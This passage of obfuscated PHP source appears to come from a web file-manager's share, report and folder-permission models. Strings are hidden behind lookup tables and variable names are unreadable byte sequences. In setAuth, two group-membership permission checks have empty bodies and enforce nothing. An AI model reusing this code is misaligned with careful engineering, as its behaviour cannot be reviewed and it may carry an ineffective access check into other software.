$Ğ¢ÑÍ¡Í[865] => $Ğ¢ÑÍ¡Í[12], $Ğ¢ÑÍ¡Í[1951] => 0, $Ğ¢ÑÍ¡Í[1952] => 0, $Ğ¢ÑÍ¡Í[487] => 0, $Ğ¢ÑÍ¡Í[488] => $Ğ¢ÑÍ¡Í[12], $Ğ¢ÑÍ¡Í[481] => $Ğ¢ÑÍ¡Í[12]); $¾­æş€´ = explode($Ğ¢ÑÍ¡Í[50], $Ğ¢ÑÍ¡Í[1953]); foreach ($¾­æş€´ as $©Ìæ›İØ) { if (!isset($‚â©£Ö»[$©Ìæ›İØ])) { continue; } $Ï…Åè[$©Ìæ›İØ] = $‚â©£Ö»[$©Ìæ›İØ]; } $ƒ‹«İë¤ = $this->add($Ï…Åè); $Ş«Û•£ = array($Ğ¢ÑÍ¡Í[481] => short_id($ƒ‹«İë¤)); $this->where(array($Ğ¢ÑÍ¡Í[478] => $ƒ‹«İë¤))->save($Ş«Û•£); return $ƒ‹«İë¤; } private function _shareAuthSet($Èê²º, $‡…±“Å) { $ÂÜÍ×üß =& $_SERVER[ì…™Î¶Ï]; if (!is_array($‡…±“Å)) { return !1; } $éòò¡ñ˜ = Model($ÂÜÍ×üß[1904]); $éòò¡ñ˜->where(array($ÂÜÍ×üß[479] => $Èê²º))->delete(); $È”¦“Úæ = array(); foreach ($‡…±“Å as $ˆ†ÈšÖº) { $ë¾”äÖµ = SourceModel::TYPE_USER; if ($ˆ†ÈšÖº[$ÂÜÍ×üß[403]] == SourceModel::TYPE_GROUP) { $ë¾”äÖµ = SourceModel::TYPE_GROUP; } $‚úÓÙÏº = array($ÂÜÍ×üß[479] => $Èê²º, $ÂÜÍ×üß[403] => $ë¾”äÖµ, $ÂÜÍ×üß[495] => intval($ˆ†ÈšÖº[$ÂÜÍ×üß[495]]), $ÂÜÍ×üß[1900] => 0, $ÂÜÍ×üß[1954] => -1); if ($ˆ†ÈšÖº[$ÂÜÍ×üß[1900]]) { $‚úÓÙÏº[$ÂÜÍ×üß[1900]] = $ˆ†ÈšÖº[$ÂÜÍ×üß[1900]]; } else { if ($ˆ†ÈšÖº[$ÂÜÍ×üß[1954]]) { $‚úÓÙÏº[$ÂÜÍ×üß[1954]] = $ˆ†ÈšÖº[$ÂÜÍ×üß[1954]]; } } $È”¦“Úæ[] = $‚úÓÙÏº; } return $éòò¡ñ˜->addAll($È”¦“Úæ, array(), !0); } public function numViewAdd($œÛ½É”Š) { $É¨ıàÒ´ =& $_SERVER[ì…™Î¶Ï]; $ÍüÔ…ü = array($É¨ıàÒ´[478] => $œÛ½É”Š); $this->where($ÍüÔ…ü)->setAdd($É¨ıàÒ´[1951]); } public function numDownloadAdd($óÎ¨¡ÄŒ) { $Œ²©Öã¨ =& $_SERVER[ì…™Î¶Ï]; $¦ùøÚ×´ = array($Œ²©Öã¨[478] => $óÎ¨¡ÄŒ); $this->where($¦ùøÚ×´)->setAdd($Œ²©Öã¨[1952]); } protected function shareEdit($·«½ÆÌ£, $®œÖ²) { $Ø¼­÷¢„ =& $_SERVER[ì…™Î¶Ï]; $Ú—»€„¹ = $this->getInfo($·«½ÆÌ£); if (!$Ú—»€„¹) { return !1; } $this->_checkLinkShare($®œÖ², $Ú—»€„¹); $ò¿òó¾á = array(); $ô»ˆ”ïº = explode($Ø¼­÷¢„[50], $Ø¼­÷¢„[1955]); foreach ($ô»ˆ”ïº as $…¼«ñ¬ù) { if (!array_key_exists($…¼«ñ¬ù, $®œÖ²)) { continue; } $ò¿òó¾á[$…¼«ñ¬ù] = $®œÖ²[$…¼«ñ¬ù]; } $this->shareEventAdd($Ú—»€„¹[$Ø¼­÷¢„[394]], $®œÖ², $Ø¼­÷¢„[1769]); $this->where(array($Ø¼­÷¢„[478] => $·«½ÆÌ£))->save($ò¿òó¾á); if (isset($®œÖ²[$Ø¼­÷¢„[1944]])) { $this->_shareAuthSet($·«½ÆÌ£, $®œÖ²[$Ø¼­÷¢„[1944]]); } return !0; } private function _checkLinkShare($²—Œ„µÃ, $Áå¤¤šß) { $È‹ËÕÑ =& $_SERVER[ì…™Î¶Ï]; if ($²—Œ„µÃ[$È‹ËÕÑ[484]] != $È‹ËÕÑ[89]) { return; } $È£ßÊû× = $Áå¤¤šß[$È‹ËÕÑ[87]][$È‹ËÕÑ[394]]; if ($Áå¤¤šß[$È‹ËÕÑ[87]][$È‹ËÕÑ[33]] != $È‹ËÕÑ[192]) { $•Ö…Æ²ó = $this->_folderReport($È£ßÊû×); if (!$•Ö…Æ²ó) { return; } show_json(LNG($È‹ËÕÑ[1956]) . $È‹ËÕÑ[1957] . $•Ö…Æ²ó, !1); } $åãàüƒ× = Model($È‹ËÕÑ[800])->fileInfoGet($Áå¤¤šß[$È‹ËÕÑ[87]][$È‹ËÕÑ[394]]); if (!$åãàüƒ×) { return; } $Èù·‚¨ = $this->shareFileMeta($åãàüƒ×[$È‹ËÕÑ[458]]); if (isset($Èù·‚¨[$È‹ËÕÑ[369]]) && $Èù·‚¨[$È‹ËÕÑ[369]] == $È‹ËÕÑ[89]) { show_json(LNG($È‹ËÕÑ[1958]), !1); } } private function _folderReport($¯Äİ² †) { $ÂğÃö©ˆ =& $_SERVER[ì…™Î¶Ï]; $½ÅËû˜õ = array($ÂğÃö©ˆ[458] => array($ÂğÃö©ˆ[988], 0), $ÂğÃö©ˆ[725] => 3); $üèğéºı = Model($ÂğÃö©ˆ[1959])->where($½ÅËû˜õ)->field($ÂğÃö©ˆ[458])->select(); if (!$üèğéºı) { return !1; } $üèğéºı = array_to_keyvalue($üèğéºı, $ÂğÃö©ˆ[12], $ÂğÃö©ˆ[458]); $ÆÊŞ®–À = $ÂğÃö©ˆ[50] . $¯Äİ² † . $ÂğÃö©ˆ[50]; $½ÅËû˜õ = array($ÂğÃö©ˆ[458] => array($ÂğÃö©ˆ[7], $üèğéºı), $ÂğÃö©ˆ[512] => array($ÂğÃö©ˆ[378], "\x25{$ÆÊŞ®–À}\x25"), $ÂğÃö©ˆ[422] => 0); $éÔ´›Ä™ = Model($ÂğÃö©ˆ[800])->where($½ÅËû˜õ)->field($ÂğÃö©ˆ[1960])->find(); if (!$éÔ´›Ä™) { return !1; } $¼áŞÎ = substr($éÔ´›Ä™[$ÂğÃö©ˆ[512]], strpos($éÔ´›Ä™[$ÂğÃö©ˆ[512]], $ÆÊŞ®–À)); $½ÅËû˜õ = array($ÂğÃö©ˆ[394] => array($ÂğÃö©ˆ[7], trim($¼áŞÎ, $ÂğÃö©ˆ[50]))); $ë™ÖŠ·® = Model($ÂğÃö©ˆ[800])->where($½ÅËû˜õ)->field($ÂğÃö©ˆ[32])->select(); $ïÎšš¶ = array_to_keyvalue($ë™ÖŠ·®, $ÂğÃö©ˆ[12], $ÂğÃö©ˆ[32]); $ïÎšš¶[] = $éÔ´›Ä™[$ÂğÃö©ˆ[32]]; return implode($ÂğÃö©ˆ[8], $ïÎšš¶); } protected function remove($óÄÊ¾âä) { $Ï‰ÍÜ¦‘ =& $_SERVER[ì…™Î¶Ï]; if (is_array($óÄÊ¾âä)) { $óÄÊ¾âä = array($Ï‰ÍÜ¦‘[7], $óÄÊ¾âä); } $€åÆœ¦± = array($Ï‰ÍÜ¦‘[479] => $óÄÊ¾âä); $—›—Œîî = $this->where($€åÆœ¦±)->delete(); if ($—›—Œîî) { Model($Ï‰ÍÜ¦‘[587])->where(array($Ï‰ÍÜ¦‘[479] => $óÄÊ¾âä))->delete(); } $µ®Ã×ëà = is_array($óÄÊ¾âä) ? $óÄÊ¾âä[1] : array($óÄÊ¾âä); for ($ñÜò¯” = 0; $ñÜò¯” < count($µ®Ã×ëà); $ñÜò¯”++) { $à£ÛªŸÔ = $this->getInfo($µ®Ã×ëà[$ñÜò¯”]); if ($à£ÛªŸÔ[$Ï‰ÍÜ¦‘[486]] == $Ï‰ÍÜ¦‘[89]) { Model($Ï‰ÍÜ¦‘[555])->eventShare($à£ÛªŸÔ[$Ï‰ÍÜ¦‘[394]], $Ï‰ÍÜ¦‘[1949]); } if ($à£ÛªŸÔ[$Ï‰ÍÜ¦‘[484]] == $Ï‰ÍÜ¦‘[89]) { Model($Ï‰ÍÜ¦‘[555])->eventShare($à£ÛªŸÔ[$Ï‰ÍÜ¦‘[394]], $Ï‰ÍÜ¦‘[1948]); } } return $—›—Œîî; } protected function removeBySource($éÅÕÌğ) { $«” »Äı =& $_SERVER[ì…™Î¶Ï]; $«…ƒÚ®ƒ = array($«” »Äı[409] => array($«” »Äı[410], $éÅÕÌğ)); $÷Äë¿“¥ = $this->field($«” »Äı[479])->where($«…ƒÚ®ƒ)->select(); $÷Äë¿“¥ = array_to_keyvalue($÷Äë¿“¥, $«” »Äı[12], $«” »Äı[479]); if (!$÷Äë¿“¥) { return; } $«…ƒÚ®ƒ = array($«” »Äı[478] => array($«” »Äı[410], $÷Äë¿“¥)); $this->where($«…ƒÚ®ƒ)->delete(); Model($«” »Äı[587])->where($«…ƒÚ®ƒ)->delete(); } public function listAll($§ˆÆÕÃ) { $ûò™Ñ€Ö =& $_SERVER[ì…™Î¶Ï]; $ò…Ş¨¡« = array(); if ($§ˆÆÕÃ[$ûò™Ñ€Ö[1631]]) { $ò…Ş¨¡«[$ûò™Ñ€Ö[1631]] = $§ˆÆÕÃ[$ûò™Ñ€Ö[1631]]; } if ($§ˆÆÕÃ[$ûò™Ñ€Ö[736]]) { $éÔë¿‡› = $§ˆÆÕÃ[$ûò™Ñ€Ö[487]] ? $§ˆÆÕÃ[$ûò™Ñ€Ö[487]] : strtotime(date($ûò™Ñ€Ö[1961])); $ò…Ş¨¡«[$ûò™Ñ€Ö[193]] = array($ûò™Ñ€Ö[328], array($§ˆÆÕÃ[$ûò™Ñ€Ö[736]], $éÔë¿‡›)); } if ($§ˆÆÕÃ[$ûò™Ñ€Ö[33]]) { $ò…Ş¨¡«[$§ˆÆÕÃ[$ûò™Ñ€Ö[33]]] = 1; } else { $ò…Ş¨¡«[] = array($ûò™Ñ€Ö[484] => array($ûò™Ñ€Ö[988], 0), $ûò™Ñ€Ö[486] => array($ûò™Ñ€Ö[988], 0), $ûò™Ñ€Ö[1938] => $ûò™Ñ€Ö[1894]); } if ($§ˆÆÕÃ[$ûò™Ñ€Ö[1890]]) { $ò…Ş¨¡«[] = array($ûò™Ñ€Ö[481] => $§ˆÆÕÃ[$ûò™Ñ€Ö[1890]], $ûò™Ñ€Ö[1531] => array($ûò™Ñ€Ö[378], "\x25{$§ˆÆÕÃ[$ûò™Ñ€Ö[1890]]}\x25"), $ûò™Ñ€Ö[1938] => $ûò™Ñ€Ö[1894]); } $‡„Ÿ½óã = $this->_makeOrder()->where($ò…Ş¨¡«)->selectPage(20); if (empty($‡„Ÿ½óã[$ûò™Ñ€Ö[364]])) { return array(); } $this->_listDataApply($‡„Ÿ½óã[$ûò™Ñ€Ö[364]]); return $‡„Ÿ½óã; } public function listDataApply($‡†éâ·æ) { $this->_listDataApply($‡†éâ·æ); return $‡†éâ·æ; } private function _listDataApply(&$­ëêÙÊí) { $ßïµæ  =& $_SERVER[ì…™Î¶Ï]; $ç¦ç“×£ = array_to_keyvalue($­ëêÙÊí, $ßïµæ [12], $ßïµæ [1631]); $¹Àó›Âü = Model($ßïµæ [529])->userListInfo(array_unique($ç¦ç“×£)); $ÄìËñã± = array_to_keyvalue($­ëêÙÊí, $ßïµæ [12], $ßïµæ [394]); $ìÃ»±Ôİ = Model($ßïµæ [800])->sourceListInfo($ÄìËñã±, !0); foreach ($­ëêÙÊí as $İ×˜€£Ò => &$î¾æÀå) { $«Òé–Ò = $î¾æÀå[$ßïµæ [1631]]; $î¾æÀå[$ßïµæ [1962]] = $¹Àó›Âü[$«Òé–Ò] ? $¹Àó›Âü[$«Òé–Ò] : !1; $™¦ªÔÂÁ = $î¾æÀå[$ßïµæ [394]]; $î¾æÀå[$ßïµæ [87]] = $ìÃ»±Ôİ[$™¦ªÔÂÁ] ? $ìÃ»±Ôİ[$™¦ªÔÂÁ] : !1; if ($î¾æÀå[$ßïµæ [87]][$ßïµæ [422]] == $ßïµæ [89]) { unset($­ëêÙÊí[$İ×˜€£Ò]); } if ($î¾æÀå[$ßïµæ [87]] != $ßïµæ [190] && !$î¾æÀå[$ßïµæ [87]]) { unset($­ëêÙÊí[$İ×˜€£Ò]); } } unset($î¾æÀå); $­ëêÙÊí = array_values($­ëêÙÊí); } private function _makeOrder($ûşŠ¯Å = '') { $½ØËïĞ± =& $_SERVER[ì…™Î¶Ï]; $ˆÏ»œÛÜ = array($½ØËïĞ±[193], $½ØËïĞ±[487], $½ØËïĞ±[1951], $½ØËïĞ±[1952]); $¥£µ–Ô = array($½ØËïĞ±[439] => $½ØËïĞ±[440], $½ØËïĞ±[441] => $½ØËïĞ±[442]); $ÚÀ­¹± = Input::get($½ØËïĞ±[446], $½ØËïĞ±[7], $½ØËïĞ±[415], $ˆÏ»œÛÜ); $­ŸÁßñÔ = Input::get($½ØËïĞ±[447], $½ØËïĞ±[7], $½ØËïĞ±[1963], array($½ØËïĞ±[1889], $½ØËïĞ±[441])); $­ŸÁßñÔ = $¥£µ–Ô[$­ŸÁßñÔ]; $ûşŠ¯Å = $ûşŠ¯Å . "{$ÚÀ­¹±}\40{$­ŸÁßñÔ}"; return $this->order($ûşŠ¯Å); } public function reportAdd($Íû·ÅÆ) { $Ëœ€šË® =& $_SERVER[ì…™Î¶Ï]; $„ÊÁ¬«¹ = array($Ëœ€šË®[479] => $Íû·ÅÆ[$Ëœ€šË®[479]], $Ëœ€šË®[1631] => USER_ID); if (Model($Ëœ€šË®[1959])->where($„ÊÁ¬«¹)->find()) { return !1; } $”ü†Êóê = array($Ëœ€šË®[479] => $Íû·ÅÆ[$Ëœ€šË®[479]], $Ëœ€šË®[1531] => $Íû·ÅÆ[$Ëœ€šË®[1531]], $Ëœ€šË®[394] => $Íû·ÅÆ[$Ëœ€šË®[394]], $Ëœ€šË®[458] => $Íû·ÅÆ[$Ëœ€šË®[458]], $Ëœ€šË®[1631] => USER_ID, $Ëœ€šË®[33] => $Íû·ÅÆ[$Ëœ€šË®[33]], $Ëœ€šË®[442] => $Íû·ÅÆ[$Ëœ€šË®[442]]); return Model($Ëœ€šË®[1959])->add($”ü†Êóê); } public function reportList($’éä¦›) { $“´—Î£¢ =& $_SERVER[ì…™Î¶Ï]; $œûÍûŞâ = array(); if ($’éä¦›[$“´—Î£¢[736]]) { $îñéğ« = $’éä¦›[$“´—Î£¢[487]] ? $’éä¦›[$“´—Î£¢[487]] : strtotime(date($“´—Î£¢[1961])); $œûÍûŞâ[$“´—Î£¢[193]] = array($“´—Î£¢[328], array($’éä¦›[$“´—Î£¢[736]], $îñéğ«)); } if (isset($’éä¦›[$“´—Î£¢[33]]) && in_array($’éä¦›[$“´—Î£¢[33]], array($“´—Î£¢[89], $“´—Î£¢[426], $“´—Î£¢[1964], $“´—Î£¢[1965], $“´—Î£¢[1966]))) { $œûÍûŞâ[$“´—Î£¢[33]] = $’éä¦›[$“´—Î£¢[33]]; } if (isset($’éä¦›[$“´—Î£¢[725]]) && in_array($’éä¦›[$“´—Î£¢[725]], array($“´—Î£¢[190], $“´—Î£¢[89], $“´—Î£¢[426], $“´—Î£¢[1964]))) { $œûÍûŞâ[$“´—Î£¢[725]] = $’éä¦›[$“´—Î£¢[725]]; } $™Šñ¨­ë = Input::get($“´—Î£¢[447], $“´—Î£¢[7], $“´—Î£¢[1963], array($“´—Î£¢[1889], $“´—Î£¢[441])); $½—æîğÄ = array($“´—Î£¢[439] => $“´—Î£¢[440], $“´—Î£¢[441] => $“´—Î£¢[442]); $Çœğ˜àû = $“´—Î£¢[1967] . $½—æîğÄ[$™Šñ¨­ë]; $Üˆùšîà = Model($“´—Î£¢[1959])->where($œûÍûŞâ)->order($Çœğ˜àû)->selectPage(20); if (empty($Üˆùšîà[$“´—Î£¢[364]])) { return array(); } $‰ìºöñş = array_to_keyvalue_group($Üˆùšîà[$“´—Î£¢[364]], $“´—Î£¢[725], $“´—Î£¢[479]); if (!empty($‰ìºöñş[0])) { $’éä¦› = $‰ìºöñş[0]; $œûÍûŞâ = array($“´—Î£¢[479] => array($“´—Î£¢[7], $’éä¦›)); $Èûªôâê = $this->where($œûÍûŞâ)->field($“´—Î£¢[479])->select(); $Èûªôâê = array_to_keyvalue($Èûªôâê, $“´—Î£¢[12], $“´—Î£¢[479]); $Â„¸—ÇÙ = array_diff($’éä¦›, $Èûªôâê); if (!empty($Â„¸—ÇÙ)) { foreach ($Üˆùšîà[$“´—Î£¢[364]] as $¨°ÚĞôå => $Óüì¢) { if (in_array($Óüì¢[$“´—Î£¢[479]], $Â„¸—ÇÙ)) { unset($Üˆùšîà[$“´—Î£¢[364]][$¨°ÚĞôå]); } } } } $this->_listDataApply($Üˆùšîà[$“´—Î£¢[364]]); return $Üˆùšîà; } public function reportStatus($³Ü‘À¨Ú) { $‚¤±Ëæ£ =& $_SERVER[ì…™Î¶Ï]; $Ÿî¯ Äß = array($‚¤±Ëæ£[392] => $³Ü‘À¨Ú[$‚¤±Ëæ£[392]]); $¤¤óäœ´ = Model($‚¤±Ëæ£[1959])->where($Ÿî¯ Äß)->field($‚¤±Ëæ£[1968])->find(); if (!$¤¤óäœ´) { return !1; } $ÌÌÕš¬… = array($‚¤±Ëæ£[725] => $³Ü‘À¨Ú[$‚¤±Ëæ£[725]]); if ($³Ü‘À¨Ú[$‚¤±Ëæ£[725]] == $‚¤±Ëæ£[1964] && $¤¤óäœ´[$‚¤±Ëæ£[725]] == $‚¤±Ëæ£[1964]) { $ÌÌÕš¬…[$‚¤±Ëæ£[725]] = 0; } $Ü¨ïöó¾ = Model($‚¤±Ëæ£[1959])->where($Ÿî¯ Äß)->save($ÌÌÕš¬…); if ($³Ü‘À¨Ú[$‚¤±Ëæ£[725]] == $‚¤±Ëæ£[426]) { if ($¤¤óäœ´[$‚¤±Ëæ£[458]] != $‚¤±Ëæ£[190] && $this->shareFileMeta($¤¤óäœ´[$‚¤±Ëæ£[458]])) { $this->shareFileMeta($¤¤óäœ´[$‚¤±Ëæ£[458]], 0); } $this->remove($¤¤óäœ´[$‚¤±Ëæ£[479]]); return !0; } if ($Ü¨ïöó¾ && $³Ü‘À¨Ú[$‚¤±Ëæ£[725]] == $‚¤±Ëæ£[1964]) { $ÂÂ ğ = $ÌÌÕš¬…[$‚¤±Ëæ£[725]] == $‚¤±Ëæ£[1964] ? 1 : 0; $this->shareFileMeta($¤¤óäœ´[$‚¤±Ëæ£[458]], $ÂÂ ğ); $this->removeByFile($¤¤óäœ´[$‚¤±Ëæ£[458]]); } return $Ü¨ïöó¾; } private function removeByFile($Òù‹èÅ) { $–ˆôçƒ™ =& $_SERVER[ì…™Î¶Ï]; $èìÃáİÏ = Model($–ˆôçƒ™[800])->where(array($–ˆôçƒ™[458] => $Òù‹èÅ))->field($–ˆôçƒ™[394])->select(); $‹ÔšòÃø = array_to_keyvalue($èìÃáİÏ, $–ˆôçƒ™[12], $–ˆôçƒ™[394]); $ÚÔ¼Ìˆ¢ = array($–ˆôçƒ™[394] => array($–ˆôçƒ™[7], $‹ÔšòÃø), $–ˆôçƒ™[484] => 1); $èìÃáİÏ = $this->where($ÚÔ¼Ìˆ¢)->field($–ˆôçƒ™[479])->select(); if (empty($èìÃáİÏ)) { return; } $µ›Êï¨Ã = array_to_keyvalue($èìÃáİÏ, $–ˆôçƒ™[12], $–ˆôçƒ™[479]); $this->remove($µ›Êï¨Ã); } private function shareFileMeta($Äõñİ×­, $ĞõÏã ¨ = null) { $ƒ™İŠ¡Ù =& $_SERVER[ì…™Î¶Ï]; $ËæÜ©¡¦ = array($ƒ™İŠ¡Ù[458] => $Äõñİ×­, $ƒ™İŠ¡Ù[95] => $ƒ™İŠ¡Ù[1969]); if (is_null($ĞõÏã ¨)) { return Model($ƒ™İŠ¡Ù[1970])->where($ËæÜ©¡¦)->find(); } $ËæÜ©¡¦[$ƒ™İŠ¡Ù[369]] = $ĞõÏã ¨; Model($ƒ™İŠ¡Ù[1970])->add($ËæÜ©¡¦, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\157\x75\x72\143\145\x5f\x61\165\x74\150"; public function getAuth($¯¬åŠ—) { $´ã¨õã =& $_SERVER[ì…™Î¶Ï]; $Å»š¶ = $this->sourceAuthSelect($¯¬åŠ—); $òµÎ½¢¯ = array(); $˜åş¢á¼ = array(); $°²Û€ò = 2 << 25; foreach ($Å»š¶ as $Á×²¼’£) { $°éƒõĞ = Model($´ã¨õã[498])->listData($Á×²¼’£[$´ã¨õã[1900]]); if (!$°éƒõĞ) { continue; } $òµÎ½¢¯[] = $Á×²¼’£; $–‘±¼˜² = 0; if ($Á×²¼’£[$´ã¨õã[403]] == SourceModel::TYPE_GROUP) { $–‘±¼˜² = $°²Û€ò * 2; } if ($Á×²¼’£[$´ã¨õã[403]] == SourceModel::TYPE_USER) { $–‘±¼˜² = $°²Û€ò; } if ($Á×²¼’£[$´ã¨õã[403]] == SourceModel::TYPE_USER && $Á×²¼’£[$´ã¨õã[495]] == $´ã¨õã[190]) { $–‘±¼˜² = 0; } $˜åş¢á¼[] = $°éƒõĞ[$´ã¨õã[405]] + $–‘±¼˜²; } array_multisort($˜åş¢á¼, SORT_DESC, $òµÎ½¢¯); return $òµÎ½¢¯; } public function sourceAuthSelect($ëúÄİñ‚) { $˜‘¿ß³ =& $_SERVER[ì…™Î¶Ï]; static $™Õşé¨ = array(); $™ÁèŸ = is_array($ëúÄİñ‚) ? !1 : !0; if ($™ÁèŸ) { $ëúÄİñ‚ = array($ëúÄİñ‚); } $¿î³Úª = array(); foreach ($ëúÄİñ‚ as $úü¿Õ–) { if (isset($™Õşé¨[$úü¿Õ–])) { $¿î³Úª[$úü¿Õ–] = $™Õşé¨[$úü¿Õ–]; } } if (count($¿î³Úª) == count($ëúÄİñ‚)) { return $™ÁèŸ ? $¿î³Úª[$ëúÄİñ‚[0]] : $¿î³Úª; } $“ûÈ„¾ˆ = $˜‘¿ß³[1971]; $‹¡æ‡—ù = array($˜‘¿ß³[394] => array($˜‘¿ß³[7], $ëúÄİñ‚)); $€¾¾Œ‹û = $this->field($“ûÈ„¾ˆ)->order($˜‘¿ß³[392])->where($‹¡æ‡—ù)->select(); $€€‘îàÎ = array_to_keyvalue_group($€¾¾Œ‹û, $˜‘¿ß³[394]); foreach ($ëúÄİñ‚ as $úü¿Õ–) { $™Õşé¨[$úü¿Õ–] = $€€‘îàÎ[$úü¿Õ–] ? $€€‘îàÎ[$úü¿Õ–] : array(); } if ($™ÁèŸ) { return $€¾¾Œ‹û; } return $€€‘îàÎ; } public function setAuth($ »ÔöÌ´, $òÍÕ£šĞ) { $÷¬¢ö‚¿ =& $_SERVER[ì…™Î¶Ï]; $’ıêö¶± = Model($÷¬¢ö‚¿[1301])->sourceInfo($ »ÔöÌ´); if (!$’ıêö¶±) { return !1; } if ($’ıêö¶±[$÷¬¢ö‚¿[403]] != SourceModel::TYPE_GROUP) { return !1; } $ÓÊ†«ô¬ = 1; $ùÖ¼¸ = $’ıêö¶±[$÷¬¢ö‚¿[495]]; if ($ùÖ¼¸ != $ÓÊ†«ô¬) { $Á´­‘“ß = array($÷¬¢ö‚¿[1799] => $ùÖ¼¸); $ êøƒµ = Model($÷¬¢ö‚¿[1888])->field($÷¬¢ö‚¿[1631])->where($Á´­‘“ß)->select(); $ êøƒµ = array_to_keyvalue($ êøƒµ, $÷¬¢ö‚¿[12], $÷¬¢ö‚¿[1631]); } $ş·Ÿïœ„ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $×©îåÔ = array(); foreach ($òÍÕ£šĞ as $®ş¤å™) { if (!in_array($®ş¤å™[$÷¬¢ö‚¿[403]], $ş·Ÿïœ„)) { show_json(LNG($÷¬¢ö‚¿[1972]), !1); } if ($ùÖ¼¸ != $ÓÊ†«ô¬) { if ($®ş¤å™[$÷¬¢ö‚¿[403]] == SourceModel::TYPE_GROUP) { } if ($®ş¤å™[$÷¬¢ö‚¿[495]] != 0 && !in_array($®ş¤å™[$÷¬¢ö‚¿[495]], $ êøƒµ)) { } } if ($®ş¤å™[$÷¬¢ö‚¿[495]] == 0) { $®ş¤å™[$÷¬¢ö‚¿[403]] = SourceModel::TYPE_USER; } $×©îåÔ[] = array($÷¬¢ö‚¿[394] => $ »ÔöÌ´, $÷¬¢ö‚¿[403] => intval($®ş¤å™[$÷¬¢ö‚¿[403]]), $÷¬¢ö‚¿[495] => intval($®ş¤å™[$÷¬¢ö‚¿[495]]), $÷¬¢ö‚¿[1900] => intval($®ş¤å™[$÷¬¢ö‚¿[1900]]) ? intval($®ş¤å™[$÷¬¢ö‚¿[1900]]) : 0, $÷¬¢ö‚¿[1954] => intval($®ş¤å™[$÷¬¢ö‚¿[1954]]) ? intval($®ş¤å™[$÷¬¢ö‚¿[1954]]) : -1); } $this->where(array($÷¬¢ö‚¿[409] => $ »ÔöÌ´))->delete(); $this->addAll($×©îåÔ); return !0; } public function authClear($Â•´´å) { $§³âéş¯ =& $_SERVER[ì…™Î¶Ï]; $òÙ’ó¥Ğ = Model($§³âéş¯[1301])->sourceInfo($Â•´´å); $Á§²óºÍ = array($Â•´´å); if ($òÙ’ó¥Ğ[$§³âéş¯[402]] == $§³âéş¯[89]) { $©¦ë¯÷¿ = array($§³âéş¯[575] => array($§³âéş¯[535], $òÙ’ó¥Ğ[$§³âéş¯[512]] . $Â•´´å . $§³âéş¯[536])); $Á§²óºÍ = Model($§³âéş¯[1301])->field($§³âéş¯[409])->where($©¦ë¯÷¿)->getField($§³âéş¯[394], !0); $Á§²óºÍ[] = $Â•´´å; } $this->where(array($§³âéş¯[409] => array($§³âéş¯[410], $Á§²óºÍ)))->delete(); return !0; } public function getAllChildren($Çş Á€¨) { $ÍÎ‹¤ÊŠ =& $_SERVER[ì…™Î¶Ï]; $ÖøÁØá÷ = Model($ÍÎ‹¤ÊŠ[1301])->sourceInfo($Çş Á€¨); if ($ÖøÁØá÷[$ÍÎ‹¤ÊŠ[402]] != $ÍÎ‹¤ÊŠ[89]) { return $this->sourceListAuth(array($Çş Á€¨)); } if ($ÖøÁØá÷[$ÍÎ‹¤ÊŠ[403]] != SourceModel::TYPE_GROUP) { return array(); } $è°ç˜Ö» = 1; $Ä€İ’õ½ = array($Çş Á€¨); if ($ÖøÁØá÷[$ÍÎ‹¤ÊŠ[489]] == $ÍÎ‹¤ÊŠ[190] && $ÖøÁØá÷[$ÍÎ‹¤ÊŠ[495]] != $è°ç˜Ö») { $Ä€İ’õ½ = $this->groupChidldAllRootSource($ÖøÁØá÷[$ÍÎ‹¤ÊŠ[495]]); } $˜äç®‚à = $this->field($ÍÎ‹¤ÊŠ[394])->group($ÍÎ‹¤ÊŠ[394])->select(); $˜äç®‚à = array_to_keyvalue($˜äç®‚à, $ÍÎ‹¤ÊŠ[12], $ÍÎ‹¤ÊŠ[394]); if (!$˜äç®‚à) { return array(); } $íèá«õò = $ÍÎ‹¤ÊŠ[1973]; $—åˆï“ = array($ÍÎ‹¤ÊŠ[394] => array($ÍÎ‹¤ÊŠ[7], $˜äç®‚à), $ÍÎ‹¤ÊŠ[422] => $ÍÎ‹¤ÊŠ[190]); $¶¬ªü«î = Model($ÍÎ‹¤ÊŠ[800])->field($íèá«õò)->where($—åˆï“)->select(); $·Ó¬¤½¡ = array($Çş Á€¨); foreach ($¶¬ªü«î as $˜‹“Ïœì) { foreach ($Ä€İ’õ½ as $Ÿº’¡×¢) { $ÄÃ¥¦–„ = $ÍÎ‹¤ÊŠ[50] . $Ÿº’¡×¢ . $ÍÎ‹¤ÊŠ[50]; $ƒ½òÒ‚© = $˜‹“Ïœì[$ÍÎ‹¤ÊŠ[512]] . $˜‹“Ïœì[$ÍÎ‹¤ÊŠ[394]] . $ÍÎ‹¤ÊŠ[50]; if (strstr($ƒ½òÒ‚©, $ÄÃ¥¦–„)) { $·Ó¬¤½¡[] = $˜‹“Ïœì[$ÍÎ‹¤ÊŠ[394]]; break; } } } return $this->sourceListAuth($·Ó¬¤½¡); } private function sourceListAuth($°·ÍÂî) { $ÁÜññÜ¢ =& $_SERVER[ì…™Î¶Ï]; $Õ…ô¢’ş = Model($ÁÜññÜ¢[1301])->sourceListInfo($°·ÍÂî, !0); $ŞŸÂ„şŞ = $this->sourceAuthSelect($°·ÍÂî); $ñáşşä = array(); $—ÑÂ½ïô = array(); foreach ($Õ…ô¢’ş as $íÔ‚Ãİ±) { unset($íÔ‚Ãİ±[$ÁÜññÜ¢[445]]); unset($íÔ‚Ãİ±[$ÁÜññÜ¢[443]]); unset($íÔ‚Ãİ±[$ÁÜññÜ¢[405]]); unset($íÔ‚Ãİ±[$ÁÜññÜ¢[87]]); $Î–ÏÀ¢ß = $ŞŸÂ„şŞ[$íÔ‚Ãİ±[$ÁÜññÜ¢[394]]]; if (!$Î–ÏÀ¢ß) { continue; } $íÔ‚Ãİ±[$ÁÜññÜ¢[1974]] = $this->authTargetInfo($Î–ÏÀ¢ß); $íÔ‚Ãİ±[$ÁÜññÜ¢[510]] = rtrim($íÔ‚Ãİ±[$ÁÜññÜ¢[516]], $ÁÜññÜ¢[8]) . $ÁÜññÜ¢[8] . ltrim($íÔ‚Ãİ±[$ÁÜññÜ¢[510]], $ÁÜññÜ¢[8]); $ñáşşä[] = $íÔ‚Ãİ±; $‹š² ˆù = count(explode($ÁÜññÜ¢[8], trim($íÔ‚Ãİ±[$ÁÜññÜ¢[510]], $ÁÜññÜ¢[8]))); $—ÑÂ½ïô[] = $‹š² ˆù + ($íÔ‚Ãİ±[$ÁÜññÜ¢[33]] == $ÁÜññÜ¢[79] ? 0 : 1000); } 